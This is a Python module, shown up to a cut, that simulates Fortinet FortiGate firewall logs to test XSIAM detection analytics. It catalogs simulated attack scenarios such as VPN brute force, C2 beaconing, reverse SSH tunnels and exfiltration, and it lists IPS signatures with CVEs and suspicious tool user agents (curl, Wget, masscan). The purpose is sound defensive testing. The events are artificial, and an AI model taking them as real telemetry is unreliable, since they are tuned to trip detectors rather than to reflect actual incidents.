# modules/fortinet_fortigate.py
# Simulates Fortinet FortiGate logs in CEF syslog format for XSIAM detection testing.
# XIF: FortiGate_1_3.xif  —  dataset: fortinet_fortigate_raw
#
# FortiOS Log Reference: https://docs.fortinet.com/document/fortigate/7.4.4/fortios-log-message-reference
#
# XDM key field mappings (FortiGate_1_3.xif):
#   src/spt/shost/suser                     → xdm.source.*
#   dst/dpt/dhost/duser                     → xdm.target.*
#   out / in                                → xdm.source/target.sent_bytes
#   FTNTFGTsentpkt / FTNTFGTrcvdpkt        → xdm.source/target.sent_packets
#   FTNTFGTduration                         → xdm.event.duration (×1000 ms)
#   FTNTFGTpolicyname/profile/applist/      → xdm.network.rule (array join)
#     policyid/shaping policyid
#   FTNTFGTattack/virus/vulnname/threattype → xdm.alert.original_threat_name
#   FTNTFGTattackid/virusid/vulnid/cveid   → xdm.alert.original_threat_id
#   FTNTFGTviruscat                         → xdm.alert.category
#   FTNTFGTCRlevel / FTNTFGTseverity        → xdm.alert.severity
#   FTNTFGTref                              → xdm.alert.description
#   FTNTFGTincidentserialno                 → xdm.alert.original_alert_id
#   FTNTFGTlogdesc                          → xdm.alert.subcategory
#   FTNTFGTqname/qtype/qclass              → xdm.network.dns.*
#   FTNTFGThttpmethod / FTNTFGThttpcode    → xdm.network.http.*
#   FTNTFGTreferralurl                      → xdm.network.http.referrer
#   request (+ dhost + dpt)                → xdm.network.http.url / xdm.target.url
#   requestContext / FTNTFGTcatdesc         → xdm.network.http.url_category
#   FTNTFGTforwardedfor                     → xdm.network.http.http_header (X-Forwarded-For)
#   FTNTFGTcipher / FTNTFGTtlsver          → xdm.network.tls.cipher/version
#   FTNTFGTscertcname / FTNTFGTscertissuer → xdm.network.tls.server*
#   FTNTFGTccertissuer                      → xdm.network.tls.client_certificate.issuer
#   FTNTFGTfilehash (len 32=md5, 64=sha256)→ xdm.target.file.md5 / sha256
#   FTNTFGTfiletype / fname / fsize         → xdm.target.file.*
#   FTNTFGTtunnelip / FTNTFGTassignip      → xdm.intermediate.*
#   FTNTFGTtunnelid / FTNTFGTvpntunnel     → xdm.intermediate.host.*
#   FTNTFGTxauthuser / FTNTFGTxauthgroup   → xdm.intermediate.user.*
#   act / FTNTFGTsslaction / FTNTFGTutmaction → xdm.observer.action
#   outcome / FTNTFGTresult                 → xdm.event.outcome
#   reason / FTNTFGTerror / FTNTFGTerror_num → xdm.event.outcome_reason
#   FTNTFGTsubtype                          → xdm.event.type / operation_sub_type
#   FTNTFGTlogid                            → xdm.event.id
#   FTNTFGTosname / FTNTFGTdstosname       → xdm.source/target.host.os
#   FTNTFGTsrccountry/city/srcregion       → xdm.source.location.*
#   FTNTFGTdstcountry/city/dstregion       → xdm.target.location.*
#   FTNTFGTapp + FTNTFGTappid              → xdm.target.application.name
#   FTNTFGTappcat                           → xdm.network.application_protocol_category
#   FTNTFGTapprisk                          → part of xdm.alert.severity
#   FTNTFGTgroup / FTNTFGTadgroup          → xdm.source.user.groups
#   FTNTFGTvd                               → xdm.source.user.domain (VDOM)
#   FTNTFGTfctuid                           → xdm.source.user.identifier
#   FTNTFGTsrcuuid                          → xdm.source.host.device_id
#   FTNTFGTsrcmac / FTNTFGTmastersrcmac    → xdm.source.host.mac_addresses + xdm.source.interface
#   FTNTFGTdstmac / FTNTFGTmasterdstmac    → xdm.target.host.mac_addresses + xdm.target.interface
#   FTNTFGTsrchwvendor / FTNTFGTmanuf      → xdm.source.host.manufacturer
#   FTNTFGTdsthwvendor                      → xdm.target.host.manufacturer
#   dvchost / deviceExternalId              → xdm.observer.name / unique_identifier
#   cefDeviceVersion                        → xdm.observer.version
#   externalId                              → xdm.network.session_id
#   sourceTranslatedAddress                 → included in src IP array
#   FTNTFGTnat / FTNTFGTsaddr              → included in src IP array
#   cat (numeric FortiGuard category ID)    → xdm.observer.type (URL category label)
#   sproc                                   → xdm.source.process.name
#   fname                                   → xdm.source.process.executable.filename
#   requestClientApplication               → xdm.source.user_agent

import random
import time
import uuid
import hashlib
from ipaddress import ip_network, AddressValueError

try:
    from modules.session_utils import (get_random_user, find_user_by_ip, rand_ip_from_network, host_mac,
                                       stable_vpn_ip, stable_mail_servers, weighted_destination,
                                       novel_country_vpn_ip, tor_vpn_ip, random_external_ip,
                                       rare_external_ip, rare_internal_host, rare_domain, ip_country,
                                       vpn_username, impossible_travel_ips, correlated_or_random_user)
    from modules import resolver
    from modules import threat_domains
    from modules import mgmt_plane
except ImportError:
    from session_utils import (get_random_user, find_user_by_ip, rand_ip_from_network, host_mac,
                               stable_vpn_ip, stable_mail_servers, weighted_destination,
                                       novel_country_vpn_ip, tor_vpn_ip, random_external_ip,
                                       rare_external_ip, rare_internal_host, rare_domain, ip_country,
                                       vpn_username, impossible_travel_ips, correlated_or_random_user)
    import resolver
    import mgmt_plane
    import threat_domains
# Module identity
NAME        = "Fortinet FortiGate"
DESCRIPTION = "Simulates Fortinet FortiGate traffic, UTM, and event logs in CEF syslog format."
XSIAM_PARSER = "fortinet_fortigate_raw"
CONFIG_KEY   = "fortinet_config"
SOURCE_IDENTIFIER = "af01292940d7426594d3d3e55ae17ee0"   # Cribl generic UUID -> <vendor>_<product>_raw
XSIAM_VENDOR = "Fortinet"
XSIAM_PRODUCT = "Fortigate"

# Single source of truth for threat event names and their default weights.
# Used as the fallback in _generate_threat_log and by get_threat_names().
# Add new entries here when adding a new dispatch case in _generate_threat_log.
#
# analytic: True  → event is expected to trigger an XSIAM Third-Party FW analytic
# analytic: False → event is realistic but won't fire a dedicated XSIAM alert
# xsiam_alert:    → name of the matching XSIAM analytics alert (or None)
_NON_ANALYTIC_PREFIX = "[Non-Analytic] "
_DEFAULT_THREAT_EVENTS = [
    {"event": "ips",                   "weight": 18, "analytic": False,
     "xsiam_alert": None},
    {"event": "antivirus",             "weight": 15, "analytic": False,
     "xsiam_alert": None},
    {"event": "webfilter_block",       "weight": 12, "analytic": False,
     "xsiam_alert": None},
    {"event": "large_upload",          "weight": 8,  "analytic": True,
     "xsiam_alert": "Large Upload (HTTPS)"},
    # Same exfil to an HTTPS service on a non-standard port -> the Low-severity
    # "Large Upload (HTTPS) to non-standard port" variation.
    {"event": "large_upload_nonstd_port", "weight": 2, "analytic": True,
     "xsiam_alert": "Large Upload (HTTPS)"},
    {"event": "port_scan",             "weight": 8,  "analytic": True,
     "xsiam_alert": "Port Scan"},
    {"event": "waf_attack",            "weight": 6,  "analytic": False,
     "xsiam_alert": None},
    {"event": "dos_anomaly",           "weight": 4,  "analytic": False,
     "xsiam_alert": None},
    {"event": "dlp_block",             "weight": 4,  "analytic": False,
     "xsiam_alert": None},
    {"event": "auth_brute_force",      "weight": 7,  "analytic": False,
     "xsiam_alert": None},
    # vpn_brute_force / vpn_impossible_travel REBUILT 2026-09-17 (see generators).
    # Every FortiGate VPN event also now reaches XSIAM with a BARE username and a
    # country label that matches its IP — both were silencing all VPN analytics.
    {"event": "vpn_brute_force",       "weight": 6,  "analytic": True,
     "xsiam_alert": "VPN login Brute-Force attempt"},
    {"event": "vpn_impossible_travel", "weight": 3,  "analytic": True,
     "xsiam_alert": "Impossible traveler - VPN"},
    {"event": "vpn_password_spray",    "weight": 3,  "analytic": True,
     "xsiam_alert": "VPN Login Password Spray"},
    {"event": "lateral_movement",      "weight": 5,  "analytic": True,
     "xsiam_alert": "Failed Connections"},
    {"event": "tor_connection",        "weight": 3,  "analytic": True,
     "xsiam_alert": "Recurring access to rare IP"},
    {"event": "dns_c2_beacon",         "weight": 3,  "analytic": True,
     "xsiam_alert": "Abnormal Recurring Communications to a Rare Domain"},
    {"event": "server_outbound_http",  "weight": 2,  "analytic": True,
     "xsiam_alert": "Recurring access to rare IP"},
    {"event": "rdp_lateral",           "weight": 2,  "analytic": True,
     "xsiam_alert": "Rare RDP session to a remote host"},
    {"event": "multi_dest_rdp",        "weight": 2,  "analytic": True,
     "xsiam_alert": "Abnormal RDP connections to multiple hosts"},
    {"event": "app_control_block",     "weight": 2,  "analytic": False,
     "xsiam_alert": None},
    # Analytic successors to webfilter_block / app_control_block, NEW 2026-09-17.
    # The originals stay as genuine vendor noise: a BLOCK means no communication
    # happened, which is the opposite of what these detectors look for.
    {"event": "rare_domain_communication", "weight": 4, "analytic": True,
     "xsiam_alert": "Abnormal Communication to a Rare Domain"},
    {"event": "recurring_rare_domain", "weight": 3, "analytic": True,
     "xsiam_alert": "Abnormal Communication to a Rare Domain"},
    {"event": "rare_appid_session", "weight": 3, "analytic": True,
     "xsiam_alert": "Rare AppID usage to a rare destination"},
    {"event": "torrent_client",        "weight": 3,  "analytic": True,
     "xsiam_alert": "A Torrent client was detected on a host"},
    {"event": "vpn_tor_login",         "weight": 3,  "analytic": True,
     "xsiam_alert": "Recurring access to rare IP"},
    {"event": "smb_new_host_lateral",  "weight": 4,  "analytic": True,
     "xsiam_alert": "Rare SMB session to a remote host"},
    {"event": "smb_rare_file_transfer","weight": 3,  "analytic": True,
     "xsiam_alert": "Rare SMB session to a remote host"},
    {"event": "smb_share_enumeration", "weight": 5,  "analytic": True,
     "xsiam_alert": "Rare SMB session to a remote host"},
    {"event": "rare_external_rdp",     "weight": 2,  "analytic": True,
     "xsiam_alert": "Rare RDP session to a remote host"},
    {"event": "smtp_spray",            "weight": 2,  "analytic": True,
     "xsiam_alert": "Spam Bot Traffic"},
    {"event": "smtp_large_exfil",      "weight": 2,  "analytic": True,
     "xsiam_alert": "Large Upload (SMTP)"},
    # "Large Upload (FTP)" is a real third-party-firewall analytic, though it is missing
    # from the published Third-Party Firewalls list.
    {"event": "ftp_large_exfil",       "weight": 2,  "analytic": True,
     "xsiam_alert": "Large Upload (FTP)"},
    {"event": "ddns_connection",       "weight": 2,  "analytic": True,
     "xsiam_alert": "Recurring rare domain access to dynamic DNS domain"},
    {"event": "large_download",        "weight": 3,  "analytic": False,
     "xsiam_alert": None},
    {"event": "dns_tunneling",         "weight": 3,  "analytic": False,
     "xsiam_alert": None},
    {"event": "reverse_ssh_tunnel",    "weight": 2,  "analytic": True,
     "xsiam_alert": "Uncommon SSH session was established"},
    {"event": "ldap_recon",            "weight": 3,  "analytic": False,
     "xsiam_alert": None},
    {"event": "vpn_abnormal_os",       "weight": 2,  "analytic": True,
     "xsiam_alert": "VPN access with an abnormal operating system"},
    {"event": "vpn_new_country_login", "weight": 3,  "analytic": True,
     "xsiam_alert": "First successful VPN access from a country in organization"},
    # external_port_scan is realistic perimeter traffic but NOT a "Port Scan" analytic:
    # that detector profiles YOUR endpoints ("The endpoint connected, or attempted to
    # connect, to multiple privileged ports"), and an internet scanner hitting the WAN is
    # not one of them. It was claimed analytic with xsiam_alert "Port Scan" and could
    # never fire that way. Relabelled [Non-Analytic]; the internal port_scan threat is
    # the one that exercises the detector.
    {"event": "external_port_scan",    "weight": 3,  "analytic": False,
     "xsiam_alert": None},
    {"event": "new_admin_behavior",    "weight": 3,  "analytic": True,
     "xsiam_alert": "New Administrative Behavior"},
    # Tier 1-3 detectors added 2026-09-18.
    {"event": "port_sweep",            "weight": 5,  "analytic": True,
     "xsiam_alert": "Port Sweep"},
    {"event": "dc_smb_outbound",       "weight": 3,  "analytic": True,
     "xsiam_alert": "Suspicious SMB connection from domain controller"},
    {"event": "new_ftp_server",        "weight": 2,  "analytic": True,
     "xsiam_alert": "New FTP Server"},
    {"event": "rare_appid",            "weight": 3,  "analytic": True,
     "xsiam_alert": "Rare AppID usage to a rare destination"},
    {"event": "abnormal_rdp_rare_host","weight": 2,  "analytic": True,
     "xsiam_alert": "Abnormal RDP session to a remote host from a rarely seen host"},
    {"event": "rare_smtp_session",     "weight": 2,  "analytic": True,
     "xsiam_alert": "Rare SMTP/S Session"},
    # Management plane (2026-10-19, gocortexio advisory corpus MANAGEMENT patterns).
    # No shipped Cortex analytic covers device administration: hunting / correlation.
    {"event": "mgmt_admin_unexpected_source", "weight": 1, "analytic": False, "xsiam_alert": None},
    {"event": "mgmt_config_route_change",     "weight": 1, "analytic": False, "xsiam_alert": None},
    {"event": "mgmt_logging_suppressed",      "weight": 1, "analytic": False, "xsiam_alert": None},
    {"event": "mgmt_config_harvest",          "weight": 1, "analytic": False, "xsiam_alert": None},
    {"event": "snmp_unexpected_source",       "weight": 1, "analytic": False, "xsiam_alert": None},
]

# --- Display-name mapping (same pattern as checkpoint_firewall.py) ---
_EVENT_DISPLAY_NAMES = {}   # event_key → display_name
_DISPLAY_TO_EVENT    = {}   # display_name → event_key  (reverse lookup)
for _e in _DEFAULT_THREAT_EVENTS:
    _key  = _e["event"]
    # The "[Non-Analytic] " display prefix is retired: non-analytic threats are simply
    # not offered on demand (modules/threat_catalog.py). Old prefixed names still resolve.
    _name = _key
    _DISPLAY_TO_EVENT[_NON_ANALYTIC_PREFIX + _key] = _key
    _EVENT_DISPLAY_NAMES[_key]  = _name
    _DISPLAY_TO_EVENT[_name]    = _key
    _DISPLAY_TO_EVENT[_key]     = _key      # also accept raw key for back-compat


def get_threat_names():
    """Return every threat name in _DEFAULT_THREAT_EVENTS (analytic or not).

    get_threat_info() carries the analytic flag and target alert; only analytic threats
    are offered for on-demand firing (modules/threat_catalog.py)."""
    return [_EVENT_DISPLAY_NAMES[e["event"]] for e in _DEFAULT_THREAT_EVENTS]


def get_threat_info():
    """Return full metadata for each threat event (name, analytic flag, XSIAM alert).

    Returns a list of dicts with keys: event, display_name, analytic, xsiam_alert, weight.
    """
    return [
        {
            "event":        e["event"],
            "display_name": _EVENT_DISPLAY_NAMES[e["event"]],
            "analytic":     e.get("analytic", True),
            "xsiam_alert":  e.get("xsiam_alert"),
            "weight":       e["weight"],
        }
        for e in _DEFAULT_THREAT_EVENTS
    ]


last_threat_event_time = 0

# Static data constants
_FIRST_OCTETS = [45, 52, 54, 62, 80, 91, 104, 142, 176, 185, 193, 194, 212, 213]

# Syslog PRI: facility local7 (23×8=184) + informational (6) = 190
# FortiGate default syslog facility is local7.
_SYSLOG_PRI = 190

# CEF severity aligned with XIF cef_pri_level mapping
_SEVERITY_MAP = {
    "debug":       "1",
    "information": "2",
    "notice":      "3",
    "warning":     "4",
    "error":       "5",
    "critical":    "6",
    "alert":       "7",
    "emergency":   "8",
}

_BROWSER_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]
_SUSPICIOUS_UA = [
    "curl/7.81.0", "python-requests/2.31.0", "Wget/1.21.4",
    "Go-http-client/1.1", "masscan/1.3", "zgrab/0.x",
]

_TLS_CIPHERS = [
    "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_GCM_SHA256", "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384",
]
_TLS_VERSIONS = ["TLSv1.3", "TLSv1.2", "TLSv1.2"]  # weighted toward 1.2

_TLS_ISSUERS = [
    "CN=DigiCert Global CA G2,O=DigiCert Inc,C=US",
    "CN=Let's Encrypt Authority X3,O=Let's Encrypt,C=US",
    "CN=GlobalSign Atlas R3 DV TLS CA 2023 Q3,O=GlobalSign nv-sa,C=BE",
    "CN=Sectigo RSA Domain Validation Secure Server CA,O=Sectigo Limited,L=Salford,C=GB",
]

# Real FortiGate IPS signatures with FortiGuard IDs, CVEs, categories, severity
_IPS_SIGNATURES = [
    {"name": "MS.SMB.Server.EternalBlue.Remote.Code.Execution",     "id": 10001, "cve": "CVE-2017-0144",  "category": "Exploit",          "severity": "critical"},
    {"name": "Apache.Log4j.Error.Log.Remote.Code.Execution",        "id": 49040, "cve": "CVE-2021-44228", "category": "Exploit",          "severity": "critical"},
    {"name": "MS.Exchange.Server.ProxyLogon.Remote.Code.Execution",  "id": 49491, "cve": "CVE-2021-26855", "category": "Exploit",          "severity": "critical"},
    {"name": "OpenSSL.Heartbleed.Information.Disclosure",            "id": 20705, "cve": "CVE-2014-0160",  "category": "Exploit",          "severity": "high"},
    {"name": "Fortinet.SSL.VPN.Credential.Exposure",                 "id": 48457, "cve": "CVE-2018-13379", "category": "Exploit",          "severity": "critical"},
    {"name": "MS.RDP.Remote.Code.Execution.BlueKeep",               "id": 46655, "cve": "CVE-2019-0708",  "category": "Exploit",          "severity": "critical"},
    {"name": "MS.Windows.Print.Spooler.PrintNightmare",             "id": 49879, "cve": "CVE-2021-34527", "category": "Exploit",          "severity": "critical"},
    {"name": "HTTP.URI.SQL.Injection",                               "id": 9103,  "cve": None,             "category": "SQL.Injection",    "severity": "high"},
    {"name": "Web.Application.Cross.Site.Scripting",                "id": 9129,  "cve": None,             "category": "XSS",              "severity": "medium"},
    {"name": "NMAP.SYN.Scan",                                        "id": 35290, "cve": None,             "category": "Reconnaissance",   "severity": "medium"},
    {"name": "PHP.CGI.Argument.Injection",                           "id": 11223, "cve": "CVE-2012-1823",  "category": "Exploit",          "severity": "high"},
    {"name": "Shellshock.Bash.Code.Injection",                       "id": 19217, "cve": "CVE-2014-6271",  "category": "Exploit",          "severity": "critical"},
    {"name": "HTTP.Suspicious.User.Agent.String",                    "id": 32001, "cve": None,             "category": "Suspicious",       "severity": "medium"},
    {"name": "TCP.SYN.Flood",                                        "id": 7000,  "cve": None,             "category": "DoS",              "severity": "high"},
    {"name": "DNS.Zone.Transfer.AXFR.Request",                      "id": 7516,  "cve": None,             "category": "Reconnaissance",   "severity": "medium"},
]

# Real FortiGate app-control blocked applications with FortiGuard app IDs
_APP_CONTROL_BLOCKS = [
    {"app": "BitTorrent",           "appid": 15001, "category": "P2P.File-Sharing", "risk": "high"},
    {"app": "Tor.Network",          "appid": 16390, "category": "Proxy",            "risk": "critical"},
    {"app": "TeamViewer",           "appid": 20306, "category": "Remote.Access",    "risk": "medium"},
    {"app": "Ultrasurf",            "appid": 16388, "category": "Proxy",            "risk": "high"},
    {"app": "CryptoMining.Generic", "appid": 46021, "category": "CryptoMining",     "risk": "high"},
    {"app": "Hola.VPN",             "appid": 48901, "category": "Proxy",            "risk": "high"},
    {"app": "AnyDesk",              "appid": 42030, "category": "Remote.Access",    "risk": "medium"},
    {"app": "Discord",              "appid": 36005, "category": "Collaboration",    "risk": "low"},
    {"app": "Telegram.Desktop",     "appid": 33491, "category": "Collaboration",    "risk": "low"},
    {"app": "Cobalt.Strike.Beacon", "appid": 48500, "category": "Malware.C2",       "risk": "critical"},
]

# FortiGuard URL category numeric IDs for the cat field → used by xdm.observer.type
_URL_CAT_BENIGN  = [30, 31, 34, 36, 37, 39, 41, 42, 46, 47, 49, 52, 81, 82]  # education, finance, health...
_URL_CAT_BLOCKED = [3, 4, 11, 14, 24, 26, 59, 61, 72, 83, 86, 96, 98, 99]   # hacking, malicious, proxy...

# External country/city data for geo enrichment
_EXT_LOCATIONS = [
    {"country": "China",        "city": "Shanghai",   "region": "Shanghai"},
    {"country": "Russia",       "city": "Moscow",     "region": "Moscow"},
    {"country": "United States","city": "Ashburn",    "region": "Virginia"},
    {"country": "Netherlands",  "city": "Amsterdam",  "region": "North Holland"},
    {"country": "Germany",      "city": "Frankfurt",  "region": "Hesse"},
    {"country": "Brazil",       "city": "Sao Paulo",  "region": "Sao Paulo"},
    {"country": "India",        "city": "Mumbai",     "region": "Maharashtra"},
    {"country": "Romania",      "city": "Bucharest",  "region": "Ilfov"},
    {"country": "Ukraine",      "city": "Kyiv",       "region": "Kiev City"},
    {"country": "Singapore",    "city": "Singapore",  "region": "Central Singapore"},
]

_SRC_OS_WINDOWS = ["Windows 10", "Windows 11", "Windows Server 2019", "Windows Server 2022"]
_SRC_OS_SERVER  = ["Linux 5.4 (CentOS 7)", "Linux 5.15 (Ubuntu 22.04)", "Linux 4.18 (RHEL 8)", "Windows Server 2019", "Windows Server 2022"]

# Common benign app/protocol data
_BENIGN_APPS = [
    ("HTTPS.BROWSER", 40568, "Web.Client",    "medium"),
    ("HTTPS",         40568, "Network.Service","low"),
    ("HTTP",          15893, "Network.Service","low"),
    ("Office365",     41025, "Collaboration",  "low"),
    ("Zoom",          43052, "Video/Audio",    "low"),
    ("Teams",         43119, "Collaboration",  "low"),
    ("Slack",         43156, "Collaboration",  "low"),
    ("Dropbox",       18311, "Cloud.Storage",  "medium"),
]

# Ports XSIAM's NDR lateral-movement analytics treats as an "administrative
# action": remote shell, remote file transfer and remote console services.
# Mapped to (service, app, appid, appcat, apprisk) so every app field the CEF
# builder seeds with a random benign value is overwritten with the real service.
_ADMIN_SERVICE_PORTS = {
    22:  ("SSH",     "SSH",    15895, "Network.Service", "medium"),
    69:  ("TFTP",    "TFTP",   16072, "Network.Service", "medium"),
    512: ("EXEC",    "REXEC",  16221, "Remote.Access",   "high"),
    992: ("TELNETS", "Telnet", 15894, "Remote.Access",   "high"),
}

# Ports the analytics profile is confirmed to count toward the new-administrative-
# action total on this data source. Remote-shell sessions are ingested but not
# counted, so the burst is filled only from these: the countable session count then
# clears the detection threshold on every invocation rather than depending on how
# the random port mix happens to fall.
_ADMIN_PORT_FILL = (22, 69)

# Dedicated internal management segment for administrative-behaviour sessions.
# It sits inside config['internal_networks'] (172.18.0.0/16) so destinations are
# genuinely internal, but is disjoint from config['internal_servers'] — which are
# the only addresses any other generator reaches on an administrative port.
_ADMIN_SEGMENT_PREFIX = "172.18"
_ADMIN_SEGMENT_BASE3  = 128          # third octet 128-255, i.e. a /17
_ADMIN_SEGMENT_SPAN   = 128 * 256    # addresses available in the segment
_ADMIN_BLOCK_SIZE     = 16           # addresses reserved per invocation

# In-memory only, by design: single-session operation, no disk persistence.
_admin_block_cursor = None


def _next_admin_targets(count):
    """Reserve `count` internal destinations not yet used on an administrative port.

    The detector counts FIRST-SEEN (destination, administrative port) pairs per
    source host, so a generator that reuses destinations exhausts itself after one
    run. The cursor is seeded from the wall clock and only ever moves forward, so a
    process restart cannot rewind onto addresses an earlier run already spent.
    """
    global _admin_block_cursor
    hour_slot = int(time.time() // 3600)
    if _admin_block_cursor is None or _admin_block_cursor < hour_slot:
        _admin_block_cursor = hour_slot
    block = _admin_block_cursor
    _admin_block_cursor += 1

    targets = []
    for i in range(count):
        idx = (block * _ADMIN_BLOCK_SIZE + i) % _ADMIN_SEGMENT_SPAN
        targets.append("%s.%d.%d" % (_ADMIN_SEGMENT_PREFIX,
                                     _ADMIN_SEGMENT_BASE3 + (idx // 256), idx % 256))
    return targets


def _admin_port_sequence(count):
    """Port list of length `count` in which every administrative port appears.

    Only the fill ports are known to be counted as administrative actions by the
    analytics profile; sessions on the remaining ports are ingested but may be
    ignored. Every port still appears once so the traffic looks like a real
    maintenance sweep, but the countable sessions carry the detection on their own.
    """
    seq = list(_ADMIN_SERVICE_PORTS)
    while len(seq) < count:
        seq.append(random.choice(_ADMIN_PORT_FILL))
    random.shuffle(seq)
    return seq[:count]


# Helper functions

def _cef_escape(v):
    """Escapes a CEF extension value per ArcSight CEF spec.
    Backslash must be escaped first, then '=' and newlines."""
    s = str(v)
    s = s.replace("\\", "\\\\")
    s = s.replace("=",  "\\=")
    s = s.replace("\n", "\\n")
    s = s.replace("\r", "\\r")
    return s


def _get_threat_interval(threat_level, config):
    if threat_level == "Benign Traffic Only":
        return 86400 * 365
    return config.get("threat_generation_levels", {}).get(threat_level, 7200)


def _get_config(config):
    return config.get(CONFIG_KEY, {})


def _random_external_ip():
    """Public (non-RFC-1918) IP from the shared ambient external-traffic pool.

    DO NOT "FIX" THIS BACK to `random.choice(first_octets)` + 3 random octets.
    That construction picked a random host inside one of 14
    different /8 blocks; a /8 spans dozens of countries, and across all modules it
    was a primary driver of the 210 DISTINCT COUNTRIES seen in
    xdm.source.location.country over 30 days.  That saturation permanently
    silenced the XSIAM analytic "First successful VPN access from a country in
    organization", which only fires on a country unseen org-wide for 30 days.
    session_utils.random_external_ip() draws from 35 individually XSIAM-PROBED
    /24s that are disjoint from config['vpn_novel_country_pool'].
    """
    return random_external_ip()


def _dns_precursor(config, src_ip, user, shost, domain, answer_ip=None):
    """Generate a DNS lookup precursor event for conversation-complete sequences.

    The client asks ITS Infoblox grid member (resolver.dns_server_for) -- the
    member the Infoblox module logs the same query on -- and FTNTFGTipaddr is
    the address the connection that follows actually goes to (`answer_ip`), or
    the shared answer for the name. It used to be 8.8.8.8 answering a random
    address, so the precursor, the Infoblox answer and the session never agreed.
    """
    forti_conf = _get_config(config)
    resolved = answer_ip or resolver.answer_for(domain, config)
    grid_name, grid_ip = resolver.dns_server_for(config, src_ip)
    fields = {
        "src":              src_ip,
        "spt":              random.randint(49152, 65535),
        "shost":            shost,
        "suser":            user,
        "dst":              forti_conf.get("dns_server") or grid_ip,
        "dhost":            f"{grid_name}.{resolver.internal_domain(config)}",
        "dpt":              53,
        "proto":            "17",
        "act":              "passthrough",
        "app":              "DNS",
        "FTNTFGTeventtype": "dns-query",
        "FTNTFGTqname":     domain,
        "FTNTFGTqtype":     "A",
        "FTNTFGTqclass":    "IN",
        "FTNTFGTipaddr":    resolved,
        "FTNTFGTpolicyid":  forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
        "FTNTFGTduration":  0,
        "out":              random.randint(50, 100),
        "in":               random.randint(50, 200),
        "FTNTFGTsentpkt":   1,
        "FTNTFGTrcvdpkt":   1,
        "FTNTFGTsrccountry":"Reserved",
        "FTNTFGTdstcountry":"Reserved",
        "FTNTFGTosname":    random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac":    _random_mac(shost),
        "FTNTFGTservice":   "DNS",
        "FTNTFGTlogdesc":   "DNS response",
        "FTNTFGTsrcintfrole": "lan",
        "FTNTFGTdstintfrole": "dmz",
        "externalId":       _session_id(),
        "outcome":          "success",
        "msg":              f"DNS query for {domain}",
    }
    return _format_fortinet_cef(config, "1501054802", "dns", "dns-query", "information", fields)


def _random_mac(host=None):
    """The source host's MAC -- stable per host, and the same NIC the Infoblox
    DHCP log leases to (session_utils.host_mac). It used to be a random OUI and
    random octets on EVERY event, so FTNTFGTsrcmac never identified a device and
    never matched a DHCP lease. Hostless flows still get a random address."""
    if host:
        return host_mac(host)
    ouis = ["00:50:56", "00:0c:29", "f4:8e:38", "3c:d9:2b", "28:d2:44", "f0:18:98"]
    return f"{random.choice(ouis)}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"


def _session_id():
    """Random 32-bit unsigned integer for externalId (FortiGate sessionid)."""
    return str(random.randint(1, 4294967295))


def _conn_timing(duration_s=None):
    """Returns (duration_s, _ignored). duration_s suitable for FTNTFGTduration.
    The second return value is unused; FTNTFGTeventtime is set in _format_fortinet_cef."""
    if duration_s is None:
        duration_s = random.randint(5, 300)
    return duration_s, None


def _ext_geo():
    """Random external location for geo-enriched fields on external traffic."""
    return random.choice(_EXT_LOCATIONS)


# Countries hosting the bulk of real Tor exit capacity, weighted roughly by share.
_TOR_EXIT_COUNTRIES = [
    ("Germany", 34), ("Netherlands", 16), ("United States", 14), ("France", 10),
    ("Romania", 7), ("Finland", 6), ("Sweden", 5), ("Switzerland", 4),
    ("Austria", 2), ("Luxembourg", 2),
]


def _tor_exit_country(tor_entry):
    """Country to report for a Tor exit node.

    Uses the country carried on the config entry when it is a real one; the live
    torproject.org bulk list has no geo data and stamps "Unknown", so fall back to
    a weighted pick from the countries that actually host exit capacity.  Never
    returns "Reserved" -- a Tor exit is a public routable address, and FortiGate
    reports "Reserved" only for RFC1918 and other reserved ranges.
    """
    if isinstance(tor_entry, dict):
        c = (tor_entry.get("country") or "").strip()
        if c and c.lower() not in ("unknown", "reserved", "na", "n/a"):
            return c
    names, weights = zip(*_TOR_EXIT_COUNTRIES)
    return random.choices(names, weights=weights)[0]


# Port → FortiGate service name mapping (real FortiGate service names)
_PORT_SERVICE_MAP = {
    21: "FTP", 22: "SSH", 23: "TELNET", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 123: "NTP", 143: "IMAP", 161: "SNMP",
    389: "LDAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS", 514: "SYSLOG",
    587: "SMTP", 636: "LDAPS", 993: "IMAPS", 995: "POP3S",
    1433: "MSSQL", 1812: "RADIUS", 3306: "MYSQL", 3389: "RDP",
    5060: "SIP", 5432: "PGSQL", 5900: "VNC", 8080: "HTTP", 8443: "HTTPS",
}


def _port_to_service(dpt):
    """Map a destination port to the FortiGate service name."""
    return _PORT_SERVICE_MAP.get(int(dpt), f"tcp/{dpt}")


def _get_user_and_host_info(config, ip_address=None, session_context=None):
    """Returns (username, hostname) from session_context or config fallback."""
    if session_context:
        if ip_address:
            result = find_user_by_ip(session_context, ip_address)
            if result and result[0]:
                return result
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        if user_info:
            return user_info["username"], user_info.get("hostname")
    forti_conf = _get_config(config)
    user_map_rev = {v: k for k, v in (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {})).items()}
    username = user_map_rev.get(ip_address)
    hostname = None
    if username:
        hostname = forti_conf.get("device_map", {}).get(username, {}).get("hostname")
    return username or "unknown", hostname


# FortiOS binds a severity level to each log ID.  Only IDs we are confident about
# are pinned here; UTM log IDs legitimately vary and are left to the caller.
#   0000000013 = LOG_ID_TRAFFIC_END_FORWARD  -> always "notice" (accept AND deny)
